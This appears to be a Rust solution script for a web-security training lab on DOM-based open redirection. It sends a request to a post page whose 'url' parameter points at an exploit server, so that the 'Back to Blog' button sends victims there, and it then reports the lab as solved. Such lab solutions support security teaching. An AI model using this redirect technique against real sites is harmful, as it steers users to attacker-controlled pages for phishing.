/******************************************************************
*
* Lab: DOM-based open redirection
*
* Hack Steps:
*      1. Fetching a post page with the url parameter set to
*         the exploit server
*      2. The victim will be redirected to the exploit server
*         when clicking on the Back to Blog button
*
*******************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a56006d04f7b253821bf7b1000b009b.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a8a0031048db205829af6a301b80018.exploit-server.net";

fn main() {
    print!("❯❯ Fetching a post page with the url parameter set to the exploit server.. ");
    io::stdout().flush().unwrap();

    let client = build_web_client();
    client
        .get(format!("{LAB_URL}/post?postId=1&url={EXPLOIT_SERVER_URL}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch the post page".red()));

    println!("{}", "OK".green());
    println!("🗹 The victim will be redirected to the exploit server when clicking on the Back to Blog button ");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
